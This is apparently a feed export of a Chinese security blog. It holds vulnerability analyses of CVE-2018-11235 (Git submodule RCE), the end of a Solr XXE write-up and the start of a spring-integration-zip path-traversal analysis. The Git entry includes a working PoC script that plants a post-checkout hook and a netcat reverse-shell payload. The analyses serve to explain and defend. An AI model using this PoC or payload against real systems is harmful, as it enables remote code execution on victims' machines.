<p>对应的<code>FileExchangeRateProvider.java</code>也换成了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Document doc = SafeXMLParsing.parseConfigXML(log, loader, currencyConfigFile);</div></pre></td></tr></table></figure></p>
<p><code>AbstractEnumField.java</code>则为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Document doc = SafeXMLParsing.parseConfigXML(log, loader, enumsConfigFile);</div></pre></td></tr></table></figure></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://issues.apache.org/jira/browse/SOLR-12450" target="_blank" rel="external">SolrSOLR-12450</a></li>
<li><a href="https://lucene.apache.org/solr/guide/6_6/configsets-api.html" target="_blank" rel="external">Sorl: ConfigSets API</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2448&quot;&gt;Apache Solr XXE漏洞分析 -【CVE-2018-8026】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="xxe" scheme="http://chybeta.github.io/tags/xxe/"/>
    
      <category term="apache" scheme="http://chybeta.github.io/tags/apache/"/>
    
      <category term="solr" scheme="http://chybeta.github.io/tags/solr/"/>
    
  </entry>
  
  <entry>
    <title>RCE with Git submodule分析-【CVE-2018-11235】</title>
    <link href="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-11235%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/</id>
    <published>2018-05-31T08:25:02.000Z</published>
    <updated>2018-07-05T00:33:24.276Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2371" target="_blank" rel="external">RCE with Git submodule 分析-【CVE-2018-11235】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dac66d0a-67bd-1.png" alt="1.png"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Github上已经放出了<a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a>，原POC还需要git clone Spoon-Knife，对此我做了一些小修改。可以见<a href="https://github.com/CHYbeta/CVE-2018-11235-DEMO" target="_blank" rel="external">CVE-2018-11235-DEMO</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/CHYbeta/CVE-2018-11235-DEMO.git</div><div class="line">./build.sh</div></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dae0b0f2-67bd-1.gif" alt="demo.gif"></p>
<p>个人本地测试Git版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu  ~/CVE-2018-11235  git --version</div><div class="line">git version 2.17.0</div></pre></td></tr></table></figure></p>
<p>其中 build.sh　主要内容如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">set</span> <span class="_">-e</span></div><div class="line"></div><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div><div class="line"></div><div class="line">repo_par=<span class="string">"<span class="variable">$PWD</span>/repo_par"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"></div><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div><div class="line"></div><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div><div class="line"></div><div class="line">git config <span class="_">-f</span> .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div><div class="line"></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span></div><div class="line"></div><div class="line">git commit -m <span class="string">"CVE-2018-11235"</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"git clone --recurse-submodules \"<span class="variable">$repo_par</span>\" dest_dir"</span></div></pre></td></tr></table></figure></p>
<p>vuln.sh:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">nc -e /bin/sh 127.0.0.1 12345</div></pre></td></tr></table></figure></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在Git中存在<a href="https://git-scm.com/book/zh/v1/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git%E6%8C%82%E9%92%A9" target="_blank" rel="external">Git Hooks</a>的操作，它们被存放在一个repo的<code>.git</code>目录下的hooks文件目录下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-daf553fe-67bd-1.png" alt="2.png"></p>
<p>当配置了这些hooks后，其本质上是脚本文件，会被Git所调用。以<code>post-checkout</code>挂钩为例，如果在hooks中存在一个<code>post-checkout</code>脚本，则当在该repo中执行<code>git checkout</code>指令时，则会自动的去执行hooks目录下的<code>post-checkout</code>脚本。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db0bfa6e-67bd-1.png" alt="3.png"></p>
<p>正常情况下，这些hook脚本并不会在clone期间进行传送。也就是说这些脚本是由客户端自己定制的。否则的话，服务端直接在repo中插入hook文件则直接造成了RCE。如下测试，clone的repo3中的hook目录中是没有<code>post-checkout</code>脚本的:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db25903c-67bd-1.png" alt="4.png"></p>
<p>而此次的RCE则是利用了Git的子模块功能，绕过了hook文件的限制。通过对子模块配置，将hook文件推送到了客户端中，从而造成RCE。</p>
<p>先介绍一下submodules即子模块。在一些项目中，项目本身需要包含并使用另外一个项目，而这两个项目又是相互独立的。为了保持提交的独立等，可以在Git中使用子模块submodules来解决。</p>
<p>以前面的build.sh中的内容为例：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div></pre></td></tr></table></figure></p>
<p>这里我们创建了一个仓库repo_sub，接着通过<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div></pre></td></tr></table></figure></p>
<p>将repo_sub作为子模块添加到了仓库repo_par中，同时指定了路径<code>vuln</code>(即别名)。</p>
<p>在<a href="https://git-scm.com/docs/gitsubmodules" target="_blank" rel="external">Git文档:gitsubmodules</a>中提到：</p>
<blockquote>
<blockquote>
<p>On the filesystem, a submodule usually (but not always - see FORMS below) consists of (i) a Git directory located under the $GIT_DIR/modules/ directory of its superproject, (ii) a working directory inside the superproject’s working directory, and a .git file at the root of the submodule’s working directory pointing to (i).</p>
</blockquote>
</blockquote>
<p>对于子模块而言，通常情况下，子模块的Git目录存放在<code>$GIT_DIR/modules/</code>中，而其工作目录即父项目的工作目录，同时在工作目录下还有一个<code>.git</code>文件来指向其Git目录。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db3c1578-67bd-1.png" alt="7.png"></p>
<p>当添加子模块完成后，在repo_par中会出现<code>.gitmodules</code>文件，该配置文件保存了项目 URL 与已经拉取的本地目录之间的映射。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db4bf8d0-67bd-1.png" alt="5.png"></p>
<p><code>.gitmodules</code>文件同样受到版本控制的影响，会一起进行推送。这样clone的用户才知道去哪里拉取具体的子模块内容。它的文件格式可以见<a href="https://git-scm.com/docs/gitmodules" target="_blank" rel="external">官方文档gitmodules</a>：</p>
<p>这里对子模块<code>vuln</code>而言，它的<code>name</code>就是<code>vuln</code>,<code>path</code>就是<code>vuln</code>,url即为<code>./../repo_sub</code>。关于这个name，在官方文档中有这样一些表述：</p>
<blockquote>
<blockquote>
<p>The file contains one subsection per submodule, and the subsection value is the name of the submodule. The name is set to the path where the submodule has been added unless it was customized with the —name option of git submodule add. Each submodule section also contains the following required keys….</p>
</blockquote>
</blockquote>
<p>接下来以git version 2.17.0为例，根据Git源代码看看漏洞的触发点。当repo存在submodule时，会从<code>.gitmodules</code>文件中读取相关信息，并将信息保存到cache中以节省资源。在submodule-config.c第563行<code>gitmodules_cb</code>的最后将会调用<code>parse_config</code>对<code>.gitmodules</code>进行解析：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">gitmodules_cb</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> repository *repo = data;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter parameter;</div><div class="line"></div><div class="line">	parameter.cache = repo-&gt;submodule_cache;</div><div class="line">	parameter.treeish_name = <span class="literal">NULL</span>;</div><div class="line">	parameter.gitmodules_sha1 = null_sha1;</div><div class="line">	parameter.overwrite = <span class="number">1</span>;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> parse_config(var, value, &amp;parameter);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>submodule-config.c第362行：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">parse_config</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter *me = data;</div><div class="line">	<span class="keyword">struct</span> submodule *submodule;</div><div class="line">	<span class="keyword">struct</span> strbuf name = STRBUF_INIT, item = STRBUF_INIT;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">/* this also ensures that we only parse submodule entries */</span></div><div class="line">	<span class="keyword">if</span> (!name_and_item_from_var(var, &amp;name, &amp;item))</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">   	submodule = lookup_or_create_by_name(me-&gt;cache,</div><div class="line">					     me-&gt;gitmodules_sha1,</div><div class="line">					     name.buf);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>name_and_item_from_var(var, &amp;name, &amp;item)</code>用于从变量<code>var</code>中获得name值，具体代码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// submodule-config.c</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">name_and_item_from_var</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">struct</span> strbuf *name,</span></span></div><div class="line">				  <span class="keyword">struct</span> strbuf *item)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *subsection, *key;</div><div class="line">	<span class="keyword">int</span> subsection_len, parse;</div><div class="line">	parse = parse_config_key(var, <span class="string">"submodule"</span>, &amp;subsection,</div><div class="line">			&amp;subsection_len, &amp;key);</div><div class="line">	<span class="keyword">if</span> (parse &lt; <span class="number">0</span> || !subsection)</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">	strbuf_add(name, subsection, subsection_len);</div><div class="line">	strbuf_addstr(item, key);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>假设<code>.gitmodules</code>中内容为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[submodule &quot;vuln&quot;]</div><div class="line">	path = vuln</div><div class="line">	url = ./../repo_sub</div></pre></td></tr></table></figure></p>
<p>则通过parse_config_key解析出来的subsection会通过strbuf_add被添加到name中，即此时name的值为<code>vuln</code></p>
<p>回到<code>parse_config</code>中，此后将通过<code>lookup_or_create_by_name(me-&gt;cache,me-&gt;gitmodules_sha1,name.buf)</code>获取子模块的信息并进行一系列操作。</p>
<p>在 <code>submodule.c</code>第1617行，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">submodule_move_head</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path,</span></span></div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *old_head,</div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *new_head,</div><div class="line">			 <span class="keyword">unsigned</span> flags)</div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 第 1617 行</span></div><div class="line">	<span class="keyword">if</span> (!(flags &amp; SUBMODULE_MOVE_HEAD_DRY_RUN)) &#123;</div><div class="line">		<span class="keyword">if</span> (old_head) &#123;</div><div class="line">			<span class="keyword">if</span> (!submodule_uses_gitfile(path))</div><div class="line">				absorb_git_dir_into_superproject(<span class="string">""</span>, path,</div><div class="line">					ABSORB_GITDIR_RECURSE_SUBMODULES);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line"></div><div class="line">			<span class="comment">/* make sure the index is clean as well */</span></div><div class="line">			submodule_reset_index(path);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (old_head &amp;&amp; (flags &amp; SUBMODULE_MOVE_HEAD_FORCE)) &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这通过<code>xstrfmt(&quot;%s/modules/%s&quot;,get_git_common_dir(), sub-&gt;name)</code>来获得子模块的Git目录。在正常情况下，对于子模块 vuln 而言，<code>get_git_common_dir</code>即父repo的Git目录，即<code>.git</code>。<code>sub-&gt;name</code>即前面获得的name值。拼接完成后子模块的Git目录即为<code>.git/modules/vuln</code></p>
<p>但从前面的代码看来，对于<code>name</code>和<code>sub-&gt;name</code>，Git并没有做相关的输入检查/路径检查。如果我们通过设置<code>name</code>为<code>../../vuln</code>，则拼接后的路径即<code>.git/modules/../../vuln</code>，即当前目录下的<code>vuln</code>目录。这里存在一个目录穿越漏洞，之后的解析将把当前目录下的<code>vuln</code>目录当做子模块的Git目录。</p>
<p>前面说到，<code>.git/hooks</code>目录中的hook脚本并不会在clone期间进行传送。结合目录穿越漏洞，我们考虑这样的攻击方式:</p>
<ol>
<li>将目录<code>.git/modules/vuln</code>拷贝到当前目录<code>modules</code>下。</li>
<li>往<code>modules/vuln</code>目录中的hooks目录添加hook脚本</li>
<li>构造子模块，使其name成为<code>../../modules/vuln</code>，使子模块的Git目录信息指向当前目录下<code>module/vuln</code></li>
<li>构造repo，使其在git clone时触发hook脚本</li>
</ol>
<p>先考虑前2条，即对应build.sh中下述代码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db698576-67bd-1.png" alt="8.png"></p>
<p>第三条：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db7682ee-67bd-1.png" alt="9.png"></p>
<p>第四点，为了让<code>.git/modules/../../modules/vuln</code>即<code>modules/vuln</code>下的hooks目录中的hook脚本被调用，执行下述语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule add &quot;$repo_submodule&quot;</div><div class="line">git commit -m &quot;CVE-2018-11235&quot;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db854040-67bd-1.png" alt="10.png"></p>
<p>再添加一个子模块。当Git地进行<code>git clone --recurse-submodules</code>时，会发现clone下来的目录中已经有了对应的子模块项目，因此实际上不需要clone，只要进行check out就行。而在check out时则会调用post-checkout脚本。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dba256e4-67bd-1.png" alt="11.png"></p>
<p>上述的分析针对 git version 2.17.0 进行。在一些低版本的Git中，由于功能等差异，可能上述环境会出错。Tony Torralba在其博客中复现了Git 2.7.4版本的漏洞，需要利用符号链接来进行RCE，具体的利用过程见 <a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">CVE-2018-11235 - Quick &amp; Dirty PoC</a></p>
<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>补丁见：<a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44" target="_blank" rel="external">https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44</a></p>
<p>主要是对从<code>.gitmodules</code>中获取的name进行了检查</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbbd8cac-67bd-1.png" alt="12.png"></p>
<p>在<code>name_and_item_from_var(var, &amp;name, &amp;item)</code>函数中调用了<code>check_submodule_name</code>来进行检查：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbd119f2-67bd-1.png" alt="13.png"></p>
<p>Git在14年也爆过RCE洞(CVE-2014–9390)，其原理也是利用了目录穿越加覆盖配置文件，在checkout时进行RCE。具体可见参考链接。</p>
<p>有些地方可能没解释清楚或有不当的地方，欢迎留言讨论。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a></li>
<li><a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/" target="_blank" rel="external">Remediating the May 2018 Git Security Vulnerability</a></li>
<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E5%AD%90%E6%A8%A1%E5%9D%97" target="_blank" rel="external">Git 工具 - 子模块</a></li>
<li><a href="https://blog.github.com/2014-12-18-vulnerability-announced-update-your-git-clients/" target="_blank" rel="external">CVE-2014–9390</a></li>
<li><a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">atorralba：CVE-2018-11235 - Quick &amp; Dirty PoC</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2371&quot;&gt;RCE with Git submodule 分析-【CVE-2018-11235】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Bin Security" scheme="http://chybeta.github.io/categories/Bin-Security/"/>
    
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="git" scheme="http://chybeta.github.io/tags/git/"/>
    
      <category term="submodule" scheme="http://chybeta.github.io/tags/submodule/"/>
    
  </entry>
  
  <entry>
    <title>Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】</title>
    <link href="http://chybeta.github.io/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1261-%E4%B8%8E-CVE-2018-1263%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-分析-【CVE-2018-1261-与-CVE-2018-1263】/</id>
    <published>2018-05-13T23:37:38.000Z</published>
    <updated>2018-07-05T00:33:37.034Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2334" target="_blank" rel="external">Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://pivotal.io/security/cve-2018-1261" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1261</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/1.png?raw=true" alt=""></p>
<p>关于 CVE-2018-1263 ，见<a href="https://xz.aliyun.com/t/2334#toc-2" target="_blank" rel="external">补丁浅析</a>部分。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/2.gif?raw=true" alt=""></p>
<p>从简单的测试代码开始：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> ResourceLoader resourceLoader = <span class="keyword">new</span> DefaultResourceLoader();</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> File path =  <span class="keyword">new</span> File(<span class="string">"./here/"</span>);</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String... args)</span> </span>&#123;</div><div class="line">		<span class="keyword">final</span> Resource evilResource = resourceLoader.getResource(<span class="string">"classpath:zip-malicious-traversal.zip"</span>);</div><div class="line">		<span class="keyword">try</span>&#123;</div><div class="line">			InputStream evilIS = evilResource.getInputStream();</div><div class="line">			Message&lt;InputStream&gt; evilMessage = MessageBuilder.withPayload(evilIS).build();</div><div class="line">			UnZipTransformer unZipTransformer = <span class="keyword">new</span> UnZipTransformer();</div><div class="line">			unZipTransformer.setWorkDirectory(path);</div><div class="line">			unZipTransformer.afterPropertiesSet();</div><div class="line">			unZipTransformer.transform(evilMessage);</div><div class="line">		&#125;<span class="keyword">catch</span> (Exception e)&#123;</div><div class="line">			System.out.println(e);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中<code>zip-malicious-traversal.zip</code>即恶意的压缩包，结构如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/2.png?raw=true" alt=""></p>
<p><code>unZipTransformer.setWorkDirectory(path);</code>设置了正常情况下解压目录为当前目录下的here文件夹，如上gif所示，在here文件夹中生成了good.txt。而evil.txt却逃逸出了这个限制，在G://tmp下生成了。</p>
<p>环境相关源码见附件。为了复现漏洞，需要在硬盘根目录下先创建一个tmp目录，<code>zip-malicious-traversal.zip</code>在CVE-2018-1261\src\main\resources中。</p>
<p>跟踪代码，在<code>unZipTransformer.transform(evilMessage);</code>处打上断点跟入。当控制流到达 org/springframework/integration/zip/transformer/UnZipTransformer.java:112<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZipUtil.iterate(inputStream, <span class="keyword">new</span> ZipEntryCallback() &#123; ... &#125;);</div></pre></td></tr></table></figure></p>
<p>这里会将inputStream输入，<code>ZipEntryCallback</code>作为回调函数。跟入<code>iterate</code> 至org/zeroturnaround/zip/ZipUtil.java。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">iterate</span><span class="params">(InputStream is, ZipEntryCallback action, Charset charset)</span> </span>&#123;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    ZipInputStream in = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</div><div class="line">        in = <span class="keyword">new</span> ZipInputStream(<span class="keyword">new</span> BufferedInputStream(is));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123; ... &#125;</div><div class="line">    ZipEntry entry;</div><div class="line">    <span class="keyword">while</span> ((entry = in.getNextEntry()) != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">        action.process(in, entry);</div><div class="line">      &#125;</div><div class="line">      ...</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
